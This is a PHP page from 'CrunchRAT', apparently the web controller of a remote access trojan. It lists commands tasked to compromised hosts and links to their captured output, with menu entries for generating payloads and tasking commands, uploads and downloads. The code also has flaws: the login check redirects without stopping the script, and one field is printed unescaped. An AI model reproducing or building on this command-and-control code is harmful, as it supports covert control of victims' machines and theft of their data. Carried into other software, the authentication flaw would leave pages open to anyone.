<?php
    # Necessary at the top of every page for session management
    session_start();

    # If the RAT user isn't authenticated
    if (!isset($_SESSION["authenticated"]))
    {
        # Redirects them to 403.php page
        header("Location: 403.php");
    }
    # Else they are authenticated
    else
    {
        # Includes the RAT configuration file
        include "config/config.php";

        # Establishes a connection to the RAT database
        # Uses variables from "config/config.php"
        # "SET NAMES utf8" is necessary to be Unicode-friendly
        $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));
    }
?>

<!doctype html>
<html lang="en">
    <head> <!-- Start of header -->
        <meta charset="utf-8">
        <title>CrunchRAT</title>
        <!-- CDN links -->
        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://cdn.datatables.net/1.10.12/css/dataTables.bootstrap.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
        <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
        <script src="https://cdn.datatables.net/1.10.12/js/dataTables.bootstrap.min.js"></script>
        <script src="https://code.jquery.com/jquery-1.12.3.js"></script>
        <script src="https://cdn.datatables.net/1.10.12/js/jquery.dataTables.min.js"></script>
        <script src="https://cdn.datatables.net/1.10.12/js/dataTables.bootstrap.min.js"></script>
    </head> <!-- End of header -->

    <body> <!-- Start of body -->
        <nav class="navbar navbar-default"> <!-- Start of navigation bar -->
            <a class="navbar-brand" href="#">CrunchRAT</a>
            <ul class="nav navbar-nav">
                <li class="nav-item"><a class="nav-link" href="index.php">Home</a></li>
                <li class="nav-item"><a class="nav-link" href="hosts.php">Hosts</a></li>
                <li class="nav-item active"><a class="nav-link" href="output.php">View Output</a></li>
                <li class="nav-item"><a class="nav-link" href="generatePayload.php">Generate Payload</a></li>
                <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Task <span class="caret"></span></a> 
                    <ul class="dropdown-menu"> <!-- Start of "Task" drop-down menu -->
                        <li><a href="tasks.php">View Tasks</a></li>
                        <li><a href="command.php">Task Command</a></li>
                        <li><a href="upload.php">Task Upload</a></li>
                        <li><a href="download.php">Task Download</a></li>
                    </ul>
                </li> <!-- End of "Task" drop-down menu -->

                <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Account Management <span class="caret"></span></a> <!-- Start of "Account Management" drop-down menu -->
                    <ul class="dropdown-menu">
                        <li><a href="addUser.php">Add User</a></li>
                        <li><a href="changePassword.php">Change Password</a></li>
                        <li role="separator" class="divider"></li>
                        <li><a href="logout.php">Logout</a></li>
                    </ul>
                </li> <!-- End of "Account Management" drop-down menu -->
                <li class="navbar-text">Currently signed in as: <b><?php echo htmlentities($_SESSION["username"]); # htmlentities() is used to protect against stored XSS here ?></b></li>
            </ul>
        </nav> <!-- End of navigation bar -->

        <div class="container"> <!-- Start of main body container -->
            <table id="outputTable" class="table table-striped table-bordered" cellspacing="0" width="100%"> <!-- Start of output dataTable -->
                <thead>
                    <tr>
                        <th style="text-align: center;">ID</th>
                        <th style="text-align: center;">Tasked By</th>
                        <th style="text-align: center;">Hostname</th>
                        <th style="text-align: center;">Action</th>
                        <th style="text-align: center;">Secondary</th>
                        <th style="text-align: center;">Output</th>
                        <th style="text-align: center;">Executed</th>
                    </tr>
                </thead>

                <tbody>
                    <?php
                        # Gets everything from "output" table
                        $statement = $dbConnection->prepare("SELECT id, user, hostname, action, secondary, output, status FROM output");
                        $statement->execute();
                        $results = $statement->fetchAll();

                        # Kills database connection
                        $statement->connection = null;

                        # Builds HTML table for each row in the "output" table
                        foreach ($results as $row)
                        {
                            echo "<tr>"; # Start of HTML table row
                            echo "<td style='text-align: center;'>" . htmlentities($row["id"], ENT_QUOTES, "UTF-8") . "</td>";
                            echo "<td style='text-align: center;'>" . htmlentities($row["user"], ENT_QUOTES, "UTF-8") . "</td>";
                            echo "<td style='text-align: center;'>" . htmlentities($row["hostname"], ENT_QUOTES, "UTF-8") . "</td>";
                            echo "<td style='text-align: center;'>" . htmlentities($row["action"], ENT_QUOTES, "UTF-8") . "</td>";
                            echo "<td>" . htmlentities($row["secondary"], ENT_QUOTES, "UTF-8") . "</td>";
            
                            # If "output" column is set
                            # We need to create a hyperlink to the command output
                            if (!empty($row["output"]))
                            { 
                                # Builds "stdout" hyperlink for the command output
                                $stdoutLink = "<a href='viewOut.php?id=" . $row["id"] . "'>output</a>";
                                echo "<td style='text-align: center;'>" . $stdoutLink . "</td>";   
                            }
                            # Else no stdout (IE: the tasked command hasn't executed yet)
                            else
                            {
                                echo "<td></td>";
                            }

                            echo "<td style='text-align: center;'>" . $row["status"] . "</td>";
                            echo "</tr>"; # End of HTML table row
                        }
                    ?>
                </tbody>
            </table> <!-- End of output dataTable -->

            <!-- Start of dataTable JavaScript code -->
            <script>
                $(document).ready(function() {
                    $('#outputTable').DataTable({
                        stateSave: true
                    });
                });
            </script> <!-- End of dataTable JavaScript code -->

            <!-- Code modified from: http://stackoverflow.com/questions/26155930/bootstraps-dropdown-with-datatables-not-working -->
            <script>
                $('body .dropdown-toggle').dropdown();
            </script>
        </div> <!-- End main body container -->
    </body> <!-- End of body -->
</html>